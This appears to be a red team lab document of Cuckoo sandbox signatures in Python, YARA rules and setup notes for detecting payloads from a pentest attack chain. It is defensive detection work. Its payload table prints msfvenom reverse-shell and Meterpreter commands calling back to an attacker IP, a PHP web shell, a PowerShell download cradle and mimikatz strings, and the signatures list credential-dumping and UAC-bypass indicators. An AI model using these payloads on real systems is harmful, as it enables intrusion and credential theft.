# Cuckoo Sandbox Signatures — Red Team Correlation

## Overview

Cuckoo sandbox analysis signatures for analyzing payloads generated during the pentest lab attack chain. These signatures detect behavioral indicators when detonating samples in an isolated analysis environment. Each signature maps back to a specific phase of the red team engagement (lab network 192.168.56.0/24).

---

## Payload Analysis Targets

Submit the following payloads from the attack chain to Cuckoo for behavioral analysis:

| Payload | Generator Command | Target Phase |
|---|---|---|
| Reverse shell EXE | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f exe` | Phase 7 — Initial Windows access |
| Meterpreter EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4445 -f exe` | Phase 7 — Interactive session |
| MSI payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4446 -f msi` | Phase 7 — AlwaysInstallElevated |
| DLL payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4447 -f dll` | Phase 7 — DLL hijacking |
| Custom SUID binary | Compiled C with `setuid(0); setgid(0); execve("/bin/sh"...)` | Phase 5 — Linux privesc |
| LD_PRELOAD .so | Shared library overriding libc functions | Phase 5 — Linux privesc |
| PHP web shell | Simple `<?php system($_GET['cmd']); ?>` or obfuscated variants | Phase 4 — Web exploitation |
| PowerShell cradle | `IEX(New-Object Net.WebClient).DownloadString(...)` saved as .ps1 | Phase 8 — Post-exploitation |

---

## Custom Cuckoo Signatures

### Signature 1: Reverse Shell — Outbound TCP Connection

```python
from lib.cuckoo.common.abstracts import Signature


class ReverseShellConnection(Signature):
    name = "reverse_shell_outbound_tcp"
    description = "Establishes outbound TCP connection consistent with a reverse shell callback"
    severity = 3
    categories = ["network", "c2"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1059", "T1071.001"]

    def on_complete(self):
        suspicious_ports = [4444, 4445, 4446, 4447, 1234, 5555, 8080, 8443]
        attacker_ip = "192.168.56.103"

        for conn in self.results.get("network", {}).get("tcp", []):
            dst = conn.get("dst")
            dport = conn.get("dport")
            if dst == attacker_ip and dport in suspicious_ports:
                self.data.append({
                    "destination": f"{dst}:{dport}",
                    "description": f"Outbound TCP to known attacker IP on port {dport}"
                })
                return True

        # Broader heuristic: any outbound connection on common shell ports
        for conn in self.results.get("network", {}).get("tcp", []):
            dport = conn.get("dport")
            if dport in suspicious_ports:
                self.data.append({
                    "destination": f"{conn.get('dst')}:{dport}",
                    "description": f"Outbound TCP on suspicious port {dport}"
                })
                return True

        return False
```

### Signature 2: Privilege Escalation — Setuid and Token Manipulation

```python
from lib.cuckoo.common.abstracts import Signature


class PrivilegeEscalationAttempt(Signature):
    name = "privilege_escalation_attempt"
    description = "Attempts privilege escalation via setuid calls or Windows token manipulation"
    severity = 3
    categories = ["escalation"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1548.001", "T1134"]

    def on_complete(self):
        # Linux: look for setuid/setgid syscalls
        linux_escalation_calls = ["setuid", "setgid", "seteuid", "setegid", "setreuid", "setregid"]
        for call in self.results.get("behavior", {}).get("summary", {}).get("api_calls", []):
            if call in linux_escalation_calls:
                self.data.append({"api_call": call})
                return True

        # Windows: token manipulation APIs
        windows_token_apis = [
            "NtOpenProcessToken", "AdjustTokenPrivileges",
            "ImpersonateLoggedOnUser", "DuplicateTokenEx",
            "SetThreadToken", "CreateProcessWithTokenW",
            "NtSetInformationToken"
        ]
        for process in self.results.get("behavior", {}).get("processes", []):
            for call in process.get("calls", []):
                api = call.get("api", "")
                if api in windows_token_apis:
                    self.data.append({
                        "api": api,
                        "process": process.get("process_name"),
                        "pid": process.get("pid")
                    })
                    return True

        return False
```

### Signature 3: Credential Dumping — SAM Registry Access

```python
from lib.cuckoo.common.abstracts import Signature


class CredentialDumpingSAM(Signature):
    name = "credential_dumping_sam_access"
    description = "Accesses SAM, SYSTEM, or SECURITY registry hives for credential extraction"
    severity = 3
    categories = ["credential_access"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1003.002", "T1003.004", "T1003.005"]

    def on_complete(self):
        # Registry key access patterns
        sam_paths = [
            "HKLM\\SAM", "HKLM\\SECURITY", "HKLM\\SYSTEM",
            "\\Registry\\Machine\\SAM", "\\Registry\\Machine\\SECURITY"
        ]

        for regkey in self.results.get("behavior", {}).get("summary", {}).get("regkey_read", []):
            for path in sam_paths:
                if path.lower() in regkey.lower():
                    self.data.append({"registry_access": regkey})
                    return True

        # File-based credential dumping (reg save)
        dump_indicators = [
            "\\sam.save", "\\sam.hiv", "\\system.save", "\\system.hiv",
            "\\security.save", "\\security.hiv", "\\sam.bak", "\\ntds.dit"
        ]
        for filepath in self.results.get("behavior", {}).get("summary", {}).get("file_written", []):
            for indicator in dump_indicators:
                if indicator.lower() in filepath.lower():
                    self.data.append({"file_written": filepath})
                    return True

        # Process-based: known credential dumping tools
        cred_tools = ["mimikatz", "secretsdump", "hashdump", "pwdump", "fgdump", "gsecdump"]
        for process in self.results.get("behavior", {}).get("processes", []):
            pname = process.get("process_name", "").lower()
            for tool in cred_tools:
                if tool in pname:
                    self.data.append({"tool_detected": pname})
                    return True

        return False
```

### Signature 4: Persistence — Registry Run Keys and Scheduled Tasks

```python
from lib.cuckoo.common.abstracts import Signature


class PersistenceMechanismCreation(Signature):
    name = "persistence_mechanism_creation"
    description = "Creates persistence via registry Run keys, scheduled tasks, or service installation"
    severity = 3
    categories = ["persistence"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1547.001", "T1053.005", "T1543.003"]

    def on_complete(self):
        found = False

        # Registry Run key persistence
        run_key_paths = [
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
            "\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
        ]
        for regkey in self.results.get("behavior", {}).get("summary", {}).get("regkey_written", []):
            for path in run_key_paths:
                if path.lower() in regkey.lower():
                    self.data.append({"persistence_type": "registry_run_key", "key": regkey})
                    found = True

        # Scheduled task creation via API
        schtask_apis = ["CTaskScheduler_CreateTask", "ITaskService_Connect"]
        for process in self.results.get("behavior", {}).get("processes", []):
            for call in process.get("calls", []):
                if call.get("api") in schtask_apis:
                    self.data.append({"persistence_type": "scheduled_task", "api": call.get("api")})
                    found = True

        # Scheduled task creation via command
        for cmd in self.results.get("behavior", {}).get("summary", {}).get("executed_commands", []):
            if "schtasks" in cmd.lower() and "/create" in cmd.lower():
                self.data.append({"persistence_type": "schtasks_command", "command": cmd})
                found = True

        # Service creation
        for regkey in self.results.get("behavior", {}).get("summary", {}).get("regkey_written", []):
            if "\\Services\\" in regkey and "ImagePath" in regkey:
                self.data.append({"persistence_type": "service_creation", "key": regkey})
                found = True

        return found
```

### Signature 5: Reconnaissance Commands

```python
from lib.cuckoo.common.abstracts import Signature


class ReconnaissanceCommands(Signature):
    name = "reconnaissance_command_execution"
    description = "Executes system reconnaissance commands consistent with post-exploitation enumeration"
    severity = 2
    categories = ["discovery"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1033", "T1082", "T1087", "T1016", "T1049"]

    def on_complete(self):
        recon_commands = [
            "whoami", "systeminfo", "net user", "net localgroup",
            "net group", "ipconfig", "hostname", "tasklist",
            "netstat", "arp -a", "route print", "net share",
            "net session", "net view", "wmic os", "wmic useraccount",
            "qwinsta", "query user", "cmdkey /list",
            "nltest /dclist", "gpresult"
        ]

        threshold = 3  # Flag if 3+ recon commands are observed
        matches = []

        for cmd in self.results.get("behavior", {}).get("summary", {}).get("executed_commands", []):
            cmd_lower = cmd.lower()
            for recon in recon_commands:
                if recon in cmd_lower:
                    matches.append({"command": cmd, "pattern": recon})
                    break

        if len(matches) >= threshold:
            self.data = matches
            self.description += f" ({len(matches)} recon commands detected)"
            return True

        return False
```

### Signature 6: Tool Staging via HTTP Download

```python
from lib.cuckoo.common.abstracts import Signature


class ToolStagingHTTPDownload(Signature):
    name = "tool_staging_http_download"
    description = "Downloads known pentest tools or stages payloads via HTTP from attacker infrastructure"
    severity = 3
    categories = ["execution", "command_and_control"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1105", "T1059.001"]

    def on_complete(self):
        attacker_ip = "192.168.56.103"

        # Known tool filenames
        tool_names = [
            "winpeas", "linpeas", "seatbelt", "sharphound", "rubeus",
            "mimikatz", "powerup", "powerview", "sharpup", "certify",
            "chisel", "ligolo", "plink", "nc.exe", "ncat.exe",
            "procdump", "lazagne", "incognito", "juicypotato",
            "printspoofer", "godpotato", "sweetpotato"
        ]

        # Check HTTP requests
        for req in self.results.get("network", {}).get("http", []):
            uri = req.get("uri", "").lower()
            host = req.get("host", "")

            # Any download from attacker IP
            if host == attacker_ip:
                self.data.append({
                    "type": "attacker_download",
                    "url": f"http://{host}{uri}"
                })
                return True

            # Known tool name in URI
            for tool in tool_names:
                if tool in uri:
                    self.data.append({
                        "type": "tool_download",
                        "tool": tool,
                        "url": f"http://{host}{uri}"
                    })
                    return True

        # Check for download cradle APIs
        cradle_apis = [
            "URLDownloadToFileW", "URLDownloadToFileA",
            "HttpSendRequestW", "InternetReadFile",
            "WinHttpReadData"
        ]
        for process in self.results.get("behavior", {}).get("processes", []):
            for call in process.get("calls", []):
                api = call.get("api", "")
                if api in cradle_apis:
                    args = call.get("arguments", {})
                    url = args.get("url", args.get("szURL", ""))
                    if attacker_ip in str(url):
                        self.data.append({
                            "type": "api_download",
                            "api": api,
                            "url": url
                        })
                        return True

        return False
```

### Signature 7: UAC Bypass Techniques

```python
from lib.cuckoo.common.abstracts import Signature


class UACBypassAttempt(Signature):
    name = "uac_bypass_attempt"
    description = "Attempts User Account Control bypass via known techniques (fodhelper, eventvwr, sdclt)"
    severity = 3
    categories = ["escalation", "defense_evasion"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1548.002"]

    def on_complete(self):
        # Registry keys abused for UAC bypass
        uac_bypass_keys = [
            "\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
            "\\Software\\Classes\\mscfile\\Shell\\Open\\command",
            "\\Software\\Classes\\exefile\\Shell\\Open\\command",
            "\\Environment\\windir",
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"
        ]

        for regkey in self.results.get("behavior", {}).get("summary", {}).get("regkey_written", []):
            for bypass_key in uac_bypass_keys:
                if bypass_key.lower() in regkey.lower():
                    self.data.append({"technique": "registry_hijack", "key": regkey})
                    return True

        # Auto-elevate binary abuse
        uac_binaries = [
            "fodhelper.exe", "eventvwr.exe", "sdclt.exe",
            "computerdefaults.exe", "slui.exe", "cmstp.exe",
            "wsreset.exe", "changepk.exe"
        ]

        for process in self.results.get("behavior", {}).get("processes", []):
            pname = process.get("process_name", "").lower()
            for binary in uac_binaries:
                if binary in pname:
                    # Check if a child process was spawned with higher integrity
                    children = process.get("children", [])
                    if children:
                        self.data.append({
                            "technique": "auto_elevate_abuse",
                            "binary": pname,
                            "children": [c.get("process_name") for c in children]
                        })
                        return True

        return False
```

### Signature 8: AlwaysInstallElevated MSI Exploitation

```python
from lib.cuckoo.common.abstracts import Signature


class AlwaysInstallElevatedExploit(Signature):
    name = "always_install_elevated_exploit"
    description = "Exploits AlwaysInstallElevated policy via malicious MSI package installation"
    severity = 3
    categories = ["escalation"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1548.002"]

    def on_complete(self):
        # Check for AlwaysInstallElevated registry reads
        aie_keys = [
            "\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
            "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
            "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"
        ]

        checked_aie = False
        for regkey in self.results.get("behavior", {}).get("summary", {}).get("regkey_read", []):
            for aie_key in aie_keys:
                if aie_key.lower() in regkey.lower():
                    checked_aie = True
                    break

        # Check for msiexec execution
        msi_exec = False
        for cmd in self.results.get("behavior", {}).get("summary", {}).get("executed_commands", []):
            if "msiexec" in cmd.lower():
                msi_exec = True
                self.data.append({"msiexec_command": cmd})

        # MSI file dropped and executed
        for filepath in self.results.get("behavior", {}).get("summary", {}).get("file_written", []):
            if filepath.lower().endswith(".msi"):
                self.data.append({"msi_dropped": filepath})
                msi_exec = True

        if checked_aie and msi_exec:
            return True

        # Alternative: msiexec with /quiet and elevated context
        for process in self.results.get("behavior", {}).get("processes", []):
            cmdline = process.get("command_line", "").lower()
            if "msiexec" in cmdline and ("/quiet" in cmdline or "/qn" in cmdline):
                self.data.append({
                    "command_line": process.get("command_line"),
                    "process_name": process.get("process_name")
                })
                return True

        return False
```

### Signature 9: DLL Hijacking

```python
from lib.cuckoo.common.abstracts import Signature


class DLLHijacking(Signature):
    name = "dll_hijacking_attempt"
    description = "Drops a DLL into a directory searched by a legitimate application for DLL hijacking"
    severity = 3
    categories = ["persistence", "escalation"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1574.001", "T1574.002"]

    def on_complete(self):
        # DLLs written to application directories (not System32)
        suspicious_dll_writes = []
        system_dirs = ["\\windows\\system32", "\\windows\\syswow64", "\\windows\\winsxs"]

        for filepath in self.results.get("behavior", {}).get("summary", {}).get("file_written", []):
            if filepath.lower().endswith(".dll"):
                in_system_dir = any(sd in filepath.lower() for sd in system_dirs)
                if not in_system_dir:
                    suspicious_dll_writes.append(filepath)

        if not suspicious_dll_writes:
            return False

        # Check if the DLL was subsequently loaded
        for dll_path in suspicious_dll_writes:
            dll_name = dll_path.split("\\")[-1].lower()
            for process in self.results.get("behavior", {}).get("processes", []):
                for module in process.get("modules", []):
                    if dll_name in module.lower():
                        self.data.append({
                            "dll_written": dll_path,
                            "loaded_by": process.get("process_name"),
                            "pid": process.get("pid")
                        })
                        return True

        # Even without confirmed load, flag the dropped DLL
        for dll_path in suspicious_dll_writes:
            self.data.append({"dll_dropped": dll_path})

        return len(suspicious_dll_writes) > 0
```

### Signature 10: WMI Persistence

```python
from lib.cuckoo.common.abstracts import Signature


class WMIPersistence(Signature):
    name = "wmi_event_subscription_persistence"
    description = "Creates WMI event subscriptions for persistence or lateral execution"
    severity = 3
    categories = ["persistence"]
    authors = ["Red Team Correlation Lab"]
    minimum = "2.0"
    ttps = ["T1546.003"]

    def on_complete(self):
        wmi_apis = [
            "IWbemServices_ExecMethod", "IWbemServices_PutInstance",
            "CoCreateInstance"
        ]

        wmi_classes = [
            "__EventFilter", "__EventConsumer", "__FilterToConsumerBinding",
            "CommandLineEventConsumer", "ActiveScriptEventConsumer"
        ]

        for process in self.results.get("behavior", {}).get("processes", []):
            for call in process.get("calls", []):
                api = call.get("api", "")
                args_str = str(call.get("arguments", {})).lower()

                if api in wmi_apis:
                    for wmi_class in wmi_classes:
                        if wmi_class.lower() in args_str:
                            self.data.append({
                                "api": api,
                                "wmi_class": wmi_class,
                                "process": process.get("process_name")
                            })
                            return True

        # Command-line based WMI persistence
        for cmd in self.results.get("behavior", {}).get("summary", {}).get("executed_commands", []):
            cmd_lower = cmd.lower()
            if "wmic" in cmd_lower and ("create" in cmd_lower or "call" in cmd_lower):
                self.data.append({"wmic_command": cmd})
                return True
            if "set-wmiinstance" in cmd_lower or "new-ciminstance" in cmd_lower:
                self.data.append({"powershell_wmi": cmd})
                return True

        return False
```

---

## Expected Behavioral Indicators

### msfvenom Reverse Shell EXE
- **Network**: Outbound TCP to 192.168.56.103:4444
- **Process**: `cmd.exe` spawned as child of payload executable
- **API**: `WSAConnect`, `CreateProcessW` with redirected stdin/stdout

### msfvenom Meterpreter EXE
- **Network**: Outbound TCP to 192.168.56.103:4445, TLS-like handshake on non-standard port
- **Process**: Reflective DLL injection into memory
- **API**: `VirtualAlloc` (RWX), `CreateThread`, `NtCreateThreadEx`
- **Memory**: Meterpreter stage shellcode patterns

### MSI Payload (AlwaysInstallElevated)
- **Registry**: Read of `AlwaysInstallElevated` under HKLM and HKCU
- **Process**: `msiexec.exe` spawning `cmd.exe` or payload
- **Network**: Outbound TCP to 192.168.56.103:4446

### DLL Payload
- **File**: DLL written to application directory
- **Process**: Legitimate application loading the dropped DLL
- **Network**: Outbound connection from the hijacked process

### SUID Backdoor Binary
- **Syscalls**: `setuid(0)`, `setgid(0)`, `execve("/bin/sh")`
- **File**: Binary with SUID bit in non-standard location
- **Process**: Privilege transition from unprivileged user to root

### LD_PRELOAD Shared Library
- **Environment**: `LD_PRELOAD` variable set pointing to custom `.so`
- **File**: Shared library written to `/tmp` or writable directory
- **Process**: Hooked libc functions behaving anomalously

### PHP Web Shell
- **File**: PHP file written to web-accessible directory
- **Process**: `www-data` spawning `sh`, `bash`, or system utilities
- **Network**: HTTP requests with `cmd=` parameter to specific PHP files

### PowerShell Download Cradle
- **Process**: `powershell.exe` with `-enc` or `IEX` in command line
- **Network**: HTTP GET to 192.168.56.103 for script download
- **API**: `URLDownloadToFileW` or `InternetReadFile`

---

## Deployment Notes

### Submitting Samples

```bash
# Submit via Cuckoo CLI
cuckoo submit --enforce-timeout --timeout 120 /path/to/payload.exe

# Submit with specific analysis package
cuckoo submit --package exe --options "procmemdump=yes,curtain=yes" payload.exe

# Submit MSI with msiexec analysis
cuckoo submit --package msi payload.msi

# Submit DLL with rundll32 analysis
cuckoo submit --package dll --options "function=DllMain" payload.dll

# Bulk submit all payloads
for f in payloads/*; do cuckoo submit --enforce-timeout "$f"; done
```

### Analysis VM Configuration

- **Windows VM**: Windows 10 x64, fully patched minus target vulns, Office installed, Python 3 for agent
- **Network**: Host-only adapter on 192.168.56.0/24, INetSim for DNS/HTTP simulation
- **Snapshots**: Clean snapshot taken after agent installation and configuration
- **AlwaysInstallElevated**: Enable in VM for MSI payload analysis (set both HKLM and HKCU registry values to 1)

### YARA Integration

Place YARA rules in `$CWD/yara/binaries/` for automatic scanning. Example rule to complement signatures:

```yara
rule msfvenom_reverse_shell {
    meta:
        description = "Detects msfvenom-generated reverse shell payloads"
        author = "Red Team Correlation Lab"
    strings:
        $ws2 = "ws2_32.dll" ascii
        $connect = { 6A 02 6A 01 6A 06 }  // socket(AF_INET, SOCK_STREAM, 0)
        $stage = { FC 48 83 E4 F0 E8 }    // Common msfvenom x64 stub
        $ip = "192.168.56.103"
    condition:
        uint16(0) == 0x5A4D and ($ws2 and $connect) or $stage or $ip
}

rule credential_dump_strings {
    meta:
        description = "Detects strings associated with credential dumping tools"
    strings:
        $m1 = "sekurlsa::logonpasswords" ascii nocase
        $m2 = "lsadump::sam" ascii nocase
        $m3 = "token::elevate" ascii nocase
        $h1 = "hashdump" ascii
        $h2 = "SAM hashes" ascii
    condition:
        any of them
}
```

### Reporting Integration

Configure `reporting.conf` to export results:
- Enable `jsondump` for programmatic parsing
- Enable `mongodb` for Cuckoo web UI queries
- Use the `notification` module to alert on severity 3 signatures
- Pipe JSON reports to SIEM via Filebeat for cross-correlation with live network logs
